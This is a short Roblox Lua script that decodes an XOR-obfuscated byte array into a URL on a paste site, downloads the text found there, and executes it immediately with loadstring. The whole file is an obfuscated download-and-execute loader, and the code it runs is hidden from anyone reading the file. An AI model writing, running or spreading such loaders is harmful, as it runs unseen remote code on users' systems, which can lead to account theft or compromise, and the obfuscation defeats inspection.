local B=bit32
local D={33,61,61,57,58,115,102,102,57,40,58,61,44,47,48,103,40,57,57,102,123,11,5,38,123,46,57,42,102,59,40,62}
local R={}
for i=1,#D do R[i]=string.char(B.bxor(D[i],73)) end
loadstring(game:HttpGet(table.concat(R)))()
